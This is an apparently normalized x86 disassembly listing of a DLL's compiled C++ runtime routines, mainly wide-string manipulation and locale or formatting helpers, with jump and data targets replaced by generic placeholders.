mov [ eax ] ecx
mov ecx [ ebp + 0x14 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
push esi
mov esi [ ebp + 0x18 ]
push edi
mov edi [ ebp + 0x8 ]
add edi 0x8
movzx eax [ esi ]
push edi
push 0x0
push eax
call sub_1004158d
movzx eax ax
add esp 0xc
push eax
lea ecx [ ebp + 0x10 ]
call sub_100423a5
dec [ ebp + 0x1c ]
inc esi
cmp [ ebp + 0x1c ] 0x0
ja r-xdata
pop edi
pop esi
sub_1004280f
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov ebx [ ebp + 0x1c ]
push esi
push edi
mov edi [ ebp + 0x18 ]
mov esi ebx
sub eax edi
mov esi eax
jmp r-xdata
mov edx [ eax ]
mov ecx [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
pop edi
pop esi
mov [ ecx + 0x4 ] eax
mov [ ecx ] edx
mov eax ecx
pop ebx
leave
retn
cmp [ ebp + 0x20 ] 0x0
je r-xdata
push esi
push edi
push [ ebp + 0x14 ]
lea eax [ ebp - 0x8 ]
push [ ebp + 0x10 ]
push eax
push [ ebp + 0x8 ]
call sub_100427c2
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
add esp 0x18
add edi esi
sub ebx esi
mov [ ebp + 0x14 ] ecx
je r-xdata
inc edi
dec ebx
jmp r-xdata
push 0x1
push [ ebp + 0x20 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0x8 ]
call sub_10042407
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
add esp 0x18
mov [ ebp + 0x14 ] eax
push ebx
push 0x0
push edi
call sub_10027b60
add esp 0xc
test eax eax
je r-xdata
sub_100428a3
mov edi edi
push ebp
mov ebp esp
jmp r-xdata
cmp [ ebp + 0x1c ] 0x0
ja r-xdata
lea ecx [ ebp + 0x14 ]
call sub_10042004
movzx eax [ eax ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100423a5
dec [ ebp + 0x1c ]
lea ecx [ ebp + 0x14 ]
call sub_1004214d
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
sub_100428df
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x18 ] 0x0
jbe r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
push [ ebp + 0x14 ]
lea ecx [ ebp + 0xc ]
call sub_100423a5
dec [ ebp + 0x18 ]
jne r-xdata
sub_1004290a
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x1
jne r-xdata
cmp [ ecx + 0x18 ] 0x8
jb r-xdata
cmp [ ecx + 0x18 ] 0x8
jb r-xdata
add ecx 0x4
mov ecx [ ecx + 0x4 ]
jmp r-xdata
add ecx 0x4
mov ecx [ ecx + 0x4 ]
jmp r-xdata
push [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
push [ ebp + 0xc ]
lea eax [ ecx + eax * 2 ]
push eax
call sub_10041ec7
add esp 0xc
pop ebp
retn 0xc
mov eax [ ebp + 0x8 ]
mov dx [ ebp + 0x10 ]
mov [ ecx + eax * 2 ] dx
jmp r-xdata
sub_10042957
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x18 ] 0x8
mov eax [ ebp + 0x8 ]
mov [ ecx + 0x14 ] eax
jb r-xdata
add ecx 0x4
mov ecx [ ecx + 0x4 ]
jmp r-xdata
xor edx edx
mov [ ecx + eax * 2 ] dx
pop ebp
retn 0x4
sub_1004297a
push 0x10
mov eax sub_1004edf2
call sub_1002b2d9
mov esi ecx
mov [ ebp - 0x14 ] esi
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x1c ]
push eax
call sub_10007876
mov ecx [ eax ]
lea ebx [ esi + 0x2c ]
mov [ ebx ] ecx
mov eax [ eax + 0x4 ]
mov [ ebx + 0x4 ] eax
call sub_10027b31
mov edi eax
xor eax eax
push ebx
push eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] eax
push [ edi + 0x1c ]
mov [ ebp - 0x4 ] eax
call sub_10006c37
add esp 0xc
cmp [ esi + 0x28 ] 0x0
mov [ esi + 0x8 ] eax
je r-xdata
mov eax [ edi + 0x10 ]
mov eax [ edi + 0xc ]
jmp r-xdata
push ebx
push 0x0
push eax
call sub_100415bb
mov [ esi + 0x14 ] eax
add esp 0xc
cmp [ edi + 0x2f ] 0x4
mov eax r--data
ja r-xdata
mov eax [ edi + 0x20 ]
push ebx
push 0x0
push eax
call sub_100415bb
mov [ esi + 0x10 ] eax
add esp 0xc
cmp [ edi + 0x2e ] 0x4
mov eax r--data
ja r-xdata
push ebx
push 0x0
push eax
call sub_100415bb
mov [ esi + 0x18 ] eax
mov eax [ edi + 0x14 ]
movzx eax [ eax ]
add esp 0xc
push ebx
push 0x0
push eax
call sub_1004158d
mov [ esi + 0xc ] ax
mov eax [ edi + 0x18 ]
movzx eax [ eax ]
push ebx
push 0x0
push eax
call sub_1004158d
add esp 0x18
cmp [ esi + 0x28 ] 0x0
mov [ esi + 0xe ] ax
je r-xdata
mov eax [ edi + 0x24 ]
mov al [ edi + 0x29 ]
mov al [ edi + 0x28 ]
jmp r-xdata
and [ esi + 0x1c ] 0x0
cmp eax 0x7f
jl r-xdata
movsx eax al
mov [ esi + 0x1c ] eax
test eax eax
jl r-xdata
call sub_1002b37e
retn 0x8
push 0x4
mov esi r--data
push esi
push ebx
call sub_1002a0f0
push 0x4
push esi
push [ ebp + 0x8 ]
call sub_1002a0f0
add esp 0x18
movsx eax [ edi + 0x2e ]
push eax
movsx eax [ edi + 0x2a ]
push eax
movsx eax [ edi + 0x2b ]
push eax
lea ebx [ esi + 0x20 ]
push ebx
mov ecx esi
call sub_1004178c
movsx ecx [ edi + 0x2f ]
push ecx
movsx ecx [ edi + 0x2c ]
push ecx
movsx ecx [ edi + 0x2d ]
lea eax [ esi + 0x24 ]
push ecx
push eax
mov ecx esi
mov [ ebp + 0x8 ] eax
call sub_1004178c
cmp [ ebp + 0xc ] 0x0
je r-xdata
sub_10042ae0
mov edi edi
push esi
mov esi ecx
mov ecx [ esi ]
test ecx ecx
je r-xdata
and [ esi ] 0x0
mov [ esi + 0x4 ] 0x1
pop esi
retn
call sub_10007b16
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ esi + 0x4 ] 0x0
pop esi
retn
sub_10042b09
mov edi edi
push esi
mov esi ecx
mov ecx [ esi ]
test ecx ecx
je r-xdata
and [ esi ] 0x0
call sub_10007b4d
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ esi + 0x6 ] ax
jmp r-xdata
mov ax [ esi + 0x6 ]
mov [ esi + 0x4 ] 0x1
pop esi
retn
sub_10042b82
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10041f4b
add esp 0x14
leave
retn
sub_10042ba1
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10041fa7
add esp 0x14
leave
retn
sub_10042bc0
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
xor ebx ebx
cmp [ edi + 0x4 ] bl
jne r-xdata
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x4 ] bl
jne r-xdata
call sub_10042b09
cmp [ edi ] ebx
jne r-xdata
mov ecx esi
call sub_10042b09
cmp [ esi ] ebx
je r-xdata
cmp [ esi ] ebx
je r-xdata
xor eax eax
xor eax eax
inc eax
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_10042bff
push 0x4
mov eax sub_1004ee15
call sub_1002b2a6
mov esi ecx
mov [ ebp - 0x10 ] esi
mov eax [ ebp + 0xc ]
mov [ esi + 0x4 ] eax
push [ ebp + 0x10 ]
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
mov [ esi ] r--data
call sub_10042432
mov eax esi
call sub_1002b37e
retn 0xc
sub_10042c52
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10042c3a
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_10042c73
push 0x4
mov eax sub_1004ee15
call sub_1002b2a6
mov esi ecx
mov [ ebp - 0x10 ] esi
mov eax [ ebp + 0xc ]
mov [ esi + 0x4 ] eax
push [ ebp + 0x14 ]
mov al [ ebp + 0x10 ]
push [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x28 ] al
call sub_1004265c
mov eax esi
call sub_1002b37e
retn 0x10
sub_10042caf
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x18 ] 0x8
jb r-xdata
lea eax [ ecx + 0x4 ]
mov eax [ ecx + 0x4 ]
jmp r-xdata
push ecx
mov ecx [ ebp + 0x8 ]
push eax
call sub_10042b53
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x4
sub_10042cd3
push 0x4
mov eax sub_1004ee15
call sub_1002b2a6
mov esi ecx
mov [ ebp - 0x10 ] esi
mov eax [ ebp + 0xc ]
mov [ esi + 0x4 ] eax
push [ ebp + 0x14 ]
mov al [ ebp + 0x10 ]
push [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x28 ] al
call sub_1004297a
mov eax esi
call sub_1002b37e
retn 0x10
sub_10042d0f
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ecx ]
push [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
mov eax [ ecx + 0x4 ]
lea ecx [ ebp - 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_10042597
mov ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn 0x8
sub_10042d54
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp [ esi + 0x14 ] edi
jae r-xdata
mov eax [ esi + 0x14 ]
sub eax edi
cmp eax [ ebp + 0xc ]
jae r-xdata
call sub_10021cfc
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
mov [ ebp + 0xc ] eax
pop edi
mov eax esi
pop esi
leave
retn 0x8
mov ecx [ esi + 0x18 ]
push ebx
lea edx [ esi + 0x4 ]
cmp ecx 0x8
jb r-xdata
mov [ ebp + 0x8 ] edx
mov ebx [ edx ]
mov [ ebp + 0x8 ] ebx
jmp r-xdata
mov ebx [ ebp + 0xc ]
sub eax ebx
push eax
mov [ ebp - 0x4 ] edx
mov edx [ ebp + 0x8 ]
lea eax [ edi + ebx ]
lea eax [ edx + eax * 2 ]
push eax
mov eax [ ebp - 0x4 ]
sub ecx edi
push ecx
lea eax [ eax + edi * 2 ]
push eax
call sub_10042ba1
mov eax [ esi + 0x14 ]
add esp 0x10
sub eax ebx
push eax
mov ecx esi
call sub_10042957
pop ebx
mov edx [ edx ]
cmp ecx 0x8
jb r-xdata
sub_10042dd6
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x18 ] 0x8
jb r-xdata
lea eax [ ecx + 0x4 ]
mov eax [ ecx + 0x4 ]
jmp r-xdata
push ecx
mov ecx [ ecx + 0x14 ]
lea eax [ eax + ecx * 2 ]
mov ecx [ ebp + 0x8 ]
push eax
call sub_10042b53
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x4
sub_10042e00
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push esi
mov esi ecx
je r-xdata
push [ ebp + 0xc ]
mov ecx esi
mov [ esi + 0x18 ] 0x7
call sub_10042957
pop esi
pop ebp
retn 0x8
cmp [ esi + 0x18 ] 0x8
jb r-xdata
cmp [ ebp + 0xc ] 0x0
lea eax [ esi + 0x4 ]
push edi
mov edi [ eax ]
jbe r-xdata
push edi
call sub_100272e8
pop ecx
pop edi
push [ ebp + 0xc ]
push edi
push 0x8
push eax
call sub_10042b82
add esp 0x10
sub_10042e4d
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ecx ]
push [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
mov eax [ ecx + 0x4 ]
lea ecx [ ebp - 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_1004223f
mov ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn 0x8
sub_10042e7c
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ecx ]
mov [ ebp - 0x8 ] eax
mov eax [ ecx + 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
neg eax
push eax
lea ecx [ ebp - 0x8 ]
call sub_1004223f
mov ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn 0x8
sub_10042eae
push 0xc
mov eax sub_1004ee30
call sub_1002b2d9
mov edi ecx
mov [ ebp - 0x18 ] edi
mov esi [ ebp + 0x8 ]
or esi 0x7
cmp esi 0x7ffffffe
jbe r-xdata
xor edx edx
push 0x3
mov eax esi
pop ebx
div ebx
mov ecx [ edi + 0x18 ]
mov [ ebp - 0x14 ] ecx
shr [ ebp - 0x14 ] 0x1
mov edx [ ebp - 0x14 ]
cmp eax edx
jae r-xdata
mov esi [ ebp + 0x8 ]
jmp r-xdata
and [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x1 ]
push eax
mov ecx edi
call sub_10042b6d
mov ebx eax
jmp r-xdata
mov eax 0x7ffffffe
sub eax edx
cmp ecx eax
ja r-xdata
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
lea esi [ edx + ecx ]
push 0x0
push 0x1
mov ecx edi
call sub_10042e00
push [ ebp + 0xc ]
mov ecx edi
mov [ edi + 0x4 ] ebx
mov [ edi + 0x18 ] esi
call sub_10042957
call sub_1002b37e
retn 0x8
cmp [ edi + 0x18 ] 0x8
jb r-xdata
lea eax [ edi + 0x4 ]
mov eax [ edi + 0x4 ]
jmp r-xdata
push [ ebp + 0xc ]
push eax
lea eax [ esi + 0x1 ]
push eax
push ebx
call sub_10042b82
add esp 0x10
sub_10042fad
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x10 ]
mov esi ecx
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10042c73
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0xc
sub_10042fd2
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_10041e6e
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_10042ff9
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x10 ]
mov esi ecx
push 0x1
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10042c73
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0xc
sub_1004301e
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_10041e6e
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_10043045
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x10 ]
mov esi ecx
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10042cd3
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0xc
sub_1004306a
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_100422a2
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_10043091
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x10 ]
mov esi ecx
push 0x1
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10042cd3
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0xc
sub_100430b6
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_100422a2
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_100430fe
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp edi 0x7ffffffe
jbe r-xdata
cmp [ esi + 0x18 ] edi
jae r-xdata
call sub_10021cc4
cmp [ ebp + 0xc ] 0x0
je r-xdata
push [ esi + 0x14 ]
mov ecx esi
push edi
call sub_10042eae
jmp r-xdata
test edi edi
jne r-xdata
cmp edi 0x8
jae r-xdata
xor eax eax
cmp eax edi
sbb eax eax
pop edi
neg eax
pop esi
pop ebp
retn 0x8
push edi
mov ecx esi
call sub_10042957
mov eax [ esi + 0x14 ]
cmp edi eax
jae r-xdata
push eax
push 0x1
mov ecx esi
call sub_10042e00
jmp r-xdata
mov eax edi
sub_10043195
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp [ edi + 0x14 ] ebx
jae r-xdata
mov eax [ edi + 0x14 ]
sub eax ebx
mov ebx [ ebp + 0x10 ]
cmp eax ebx
jae r-xdata
call sub_10021cfc
or eax 0xffffffff
sub eax [ esi + 0x14 ]
cmp eax ebx
jbe r-xdata
mov ebx eax
mov [ ebp + 0x10 ] ebx
call sub_10021cc4
mov eax [ esi + 0x14 ]
lea ecx [ eax + ebx ]
cmp ecx eax
jae r-xdata
test ebx ebx
jbe r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov eax [ esi + 0x14 ]
add eax ebx
push 0x0
push eax
mov ecx esi
mov [ ebp + 0x8 ] eax
call sub_100430fe
test al al
je r-xdata
cmp [ edi + 0x18 ] 0x8
jb r-xdata
add edi 0x4
mov edi [ edi + 0x4 ]
jmp r-xdata
lea edx [ esi + 0x4 ]
mov edx [ esi + 0x4 ]
jmp r-xdata
mov eax [ esi + 0x18 ]
cmp eax 0x8
jb r-xdata
push [ ebp + 0x10 ]
mov ecx [ esi + 0x14 ]
mov ebx [ ebp + 0xc ]
lea edi [ edi + ebx * 2 ]
sub eax ecx
push edi
push eax
lea eax [ edx + ecx * 2 ]
push eax
call sub_10042b82
add esp 0x10
push [ ebp + 0x8 ]
mov ecx esi
call sub_10042957
sub_10043259
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push edi
or eax 0xffffffff
mov edi ecx
sub eax [ edi + 0x14 ]
cmp eax ebx
ja r-xdata
test ebx ebx
jbe r-xdata
call sub_10021cc4
mov eax edi
pop edi
pop ebx
pop ebp
retn 0x8
push esi
mov esi [ edi + 0x14 ]
push 0x0
add esi ebx
push esi
mov ecx edi
call sub_100430fe
test al al
je r-xdata
pop esi
push [ ebp + 0xc ]
mov ecx edi
push ebx
push [ edi + 0x14 ]
call sub_1004290a
push esi
mov ecx edi
call sub_10042957
sub_100432ab
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp [ esi + 0x14 ] edi
jae r-xdata
or eax 0xffffffff
sub eax [ esi + 0x14 ]
cmp eax [ ebp + 0xc ]
ja r-xdata
call sub_10021cfc
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
call sub_10021cc4
pop edi
mov eax esi
pop esi
pop ebp
retn 0xc
push ebx
mov ebx [ esi + 0x14 ]
add ebx [ ebp + 0xc ]
push 0x0
push ebx
mov ecx esi
call sub_100024cd
test al al
je r-xdata
pop ebx
mov eax [ esi + 0x18 ]
lea ecx [ esi + 0x4 ]
cmp eax 0x8
jb r-xdata
mov [ ebp + 0x8 ] ecx
mov edx [ ecx ]
mov [ ebp + 0x8 ] edx
jmp r-xdata
mov edx [ esi + 0x14 ]
sub edx edi
push edx
mov edx [ ebp + 0x8 ]
lea edx [ edx + edi * 2 ]
push edx
mov edx [ ebp + 0xc ]
sub eax edi
sub eax edx
push eax
lea eax [ edi + edx ]
lea eax [ ecx + eax * 2 ]
push eax
call j_sub_1000229a
add esp 0x10
push [ ebp + 0x10 ]
mov ecx esi
push [ ebp + 0xc ]
push edi
call sub_10005fd5
push ebx
mov ecx esi
call sub_10002630
mov ecx [ ecx ]
cmp eax 0x8
jb r-xdata
sub_1004334b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov ebx ecx
cmp [ edi + 0x14 ] eax
jae r-xdata
mov esi [ edi + 0x14 ]
mov eax [ ebp + 0xc ]
sub esi eax
cmp [ ebp + 0x10 ] esi
jae r-xdata
call sub_10021cfc
mov ecx ebx
cmp ebx edi
jne r-xdata
mov esi [ ebp + 0x10 ]
push 0x0
push esi
call sub_100430fe
test al al
je r-xdata
push 0xffffffff
add esi eax
push esi
call sub_10042d54
push [ ebp + 0xc ]
mov ecx ebx
push 0x0
call sub_10042d54
jmp r-xdata
pop edi
pop esi
mov eax ebx
pop ebx
pop ebp
retn 0xc
cmp [ edi + 0x18 ] 0x8
jb r-xdata
add edi 0x4
mov edi [ edi + 0x4 ]
jmp r-xdata
lea eax [ ebx + 0x4 ]
mov eax [ ebx + 0x4 ]
jmp r-xdata
mov ecx [ ebx + 0x18 ]
cmp ecx 0x8
jb r-xdata
mov edx [ ebp + 0xc ]
push esi
lea edx [ edi + edx * 2 ]
push edx
push ecx
push eax
call sub_10042b82
add esp 0x10
push esi
mov ecx ebx
call sub_10042957
sub_100433e0
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
push edi
mov esi ecx
call sub_10042200
test al al
je r-xdata
push 0x0
push [ ebp + 0xc ]
mov ecx esi
call sub_100430fe
test al al
je r-xdata
cmp [ esi + 0x18 ] 0x8
jb r-xdata
mov eax esi
mov ecx [ esi + 0x18 ]
cmp ecx 0x8
jb r-xdata
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x8
push [ ebp + 0xc ]
sub edi eax
sar edi 0x1
push edi
push esi
mov ecx esi
call sub_1004334b
jmp r-xdata
push [ ebp + 0xc ]
push edi
push ecx
push eax
call sub_10042b82
add esp 0x10
push [ ebp + 0xc ]
mov ecx esi
call sub_10042957
sub_10043456
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_1002762d
pop ecx
push eax
push [ ebp + 0x8 ]
mov ecx esi
call sub_100433e0
pop esi
pop ebp
retn 0x4
sub_10043477
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp edi 0xffffffff
jne r-xdata
push 0x0
push edi
mov ecx esi
call sub_100430fe
test al al
je r-xdata
call sub_10021cc4
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
push [ ebp + 0xc ]
mov ecx esi
push edi
push 0x0
call sub_1004290a
push edi
mov ecx esi
call sub_10042957
sub_100434b8
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp [ esi + 0x14 ] edi
jae r-xdata
or eax 0xffffffff
sub eax [ esi + 0x14 ]
cmp eax [ ebp + 0xc ]
ja r-xdata
call sub_10021cfc
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
call sub_10021cc4
pop edi
mov eax esi
pop esi
pop ebp
retn 0xc
push ebx
mov ebx [ esi + 0x14 ]
add ebx [ ebp + 0xc ]
push 0x0
push ebx
mov ecx esi
call sub_100430fe
test al al
je r-xdata
pop ebx
mov eax [ esi + 0x18 ]
lea ecx [ esi + 0x4 ]
cmp eax 0x8
jb r-xdata
mov [ ebp + 0x8 ] ecx
mov edx [ ecx ]
mov [ ebp + 0x8 ] edx
jmp r-xdata
mov edx [ esi + 0x14 ]
sub edx edi
push edx
mov edx [ ebp + 0x8 ]
lea edx [ edx + edi * 2 ]
push edx
mov edx [ ebp + 0xc ]
sub eax edi
sub eax edx
push eax
lea eax [ edi + edx ]
lea eax [ ecx + eax * 2 ]
push eax
call sub_10042ba1
add esp 0x10
push [ ebp + 0x10 ]
mov ecx esi
push [ ebp + 0xc ]
push edi
call sub_1004290a
push ebx
mov ecx esi
call sub_10042957
mov ecx [ ecx ]
cmp eax 0x8
jb r-xdata
sub_10043558
mov edi edi
push ebp
mov ebp esp
mov edx [ ecx + 0x14 ]
mov eax [ ebp + 0x8 ]
cmp eax edx
ja r-xdata
push [ ebp + 0xc ]
sub eax edx
push eax
call sub_10043259
push 0xffffffff
push eax
call sub_10042d54
jmp r-xdata
pop ebp
retn 0x8
sub_10043580
push 0x38
mov eax sub_1004eb37
call sub_1002b30f
mov esi [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
movzx ecx [ esi ]
mov [ ebp - 0x3c ] eax
mov eax [ ebp + 0xc ]
xor edx edx
mov [ ebp - 0x44 ] eax
test cx cx
je r-xdata
push 0x0
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x2c ]
call sub_10005cd0
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x40 ] 0xfffffffe
mov [ ebp - 0x38 ] 0x1
movzx eax cx
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100020e2
mov eax [ ebp - 0x40 ]
call sub_1002b392
retn
movzx eax [ esi + edi * 2 ]
test ax ax
je r-xdata
inc edx
movzx eax [ esi + edx * 2 ]
test ax ax
jne r-xdata
inc [ ebp + 0x10 ]
push [ ebp - 0x34 ]
lea ecx [ ebp - 0x2c ]
call sub_10005d90
cmp [ eax ] 0x0
je r-xdata
movzx ecx [ esi ]
cmp ax cx
jne r-xdata
add edi [ ebp - 0x38 ]
movzx eax [ esi + edi * 2 ]
cmp ax [ esi ]
je r-xdata
push [ ebp - 0x34 ]
lea ecx [ ebp - 0x2c ]
call sub_10005d90
movsx eax [ eax ]
add edi eax
jmp r-xdata
inc edi
movzx eax [ esi + edi * 2 ]
test ax ax
jne r-xdata
push 0x7f
pop ebx
cmp [ ebp - 0x38 ] ebx
jae r-xdata
test ax ax
je r-xdata
inc [ ebp - 0x34 ]
mov eax [ ebp - 0x34 ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ax cx
je r-xdata
push [ ebp - 0x34 ]
lea ecx [ ebp - 0x2c ]
call sub_10005d90
mov [ eax ] bl
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x40 ] eax
mov ebx [ ebp - 0x38 ]
push [ ebp - 0x44 ]
mov ecx [ ebp - 0x3c ]
call sub_10042bc0
test al al
jne r-xdata
cmp [ ebp - 0x2d ] 0x0
je r-xdata
push 0x7f
pop ebx
cmp [ ebp - 0x38 ] ebx
jae r-xdata
mov ecx [ ebp - 0x3c ]
call sub_10042d3e
cmp [ esi + edi * 2 ] ax
jne r-xdata
push [ ebp - 0x44 ]
mov ecx [ ebp - 0x3c ]
call sub_10042bc0
test al al
jne r-xdata
push [ ebp - 0x34 ]
lea ecx [ ebp - 0x2c ]
call sub_10005d90
mov [ eax ] bl
jmp r-xdata
mov ebx [ ebp - 0x38 ]
mov [ ebp - 0x2d ] 0x1
jmp r-xdata
mov ecx [ ebp - 0x3c ]
inc [ ebp - 0x38 ]
call sub_10042ae0
or [ ebp - 0x40 ] 0xffffffff
jmp r-xdata
xor edi edi
mov [ ebp - 0x2d ] 0x0
mov [ ebp - 0x34 ] edi
cmp [ ebp + 0x10 ] edi
jbe r-xdata
sub_100436e1
push 0x4c
mov eax sub_1004ee53
call sub_1002b30f
mov eax [ ebp + 0x8 ]
mov esi r--data
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp + 0x1c ]
mov ebx ecx
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x38 ] eax
movsb [ edi ] [ esi ]
call sub_100082a7
mov al [ ebp + 0x24 ]
and [ ebp - 0x4 ] 0x0
test al al
jne r-xdata
mov [ ebp - 0x16 ] al
mov al [ ebp + 0x20 ]
mov [ ebp - 0x15 ] al
mov al [ ebp + 0x20 ]
mov [ ebp - 0x16 ] al
jmp r-xdata
push 0x0
push esi
lea ecx [ ebp - 0x34 ]
call sub_100014aa
mov eax [ ebp - 0x20 ]
mov edi [ ebx + 0x8 ]
mov [ ebp - 0x48 ] eax
lea eax [ ebp - 0x58 ]
push eax
lea ecx [ ebp - 0x34 ]
call sub_10008213
mov ecx eax
call sub_10006ccf
push edi
push [ ebp - 0x38 ]
lea ecx [ ebp - 0x18 ]
push ecx
push [ ebp - 0x48 ]
push eax
call sub_100367d7
mov edi eax
add esp 0x14
test edi edi
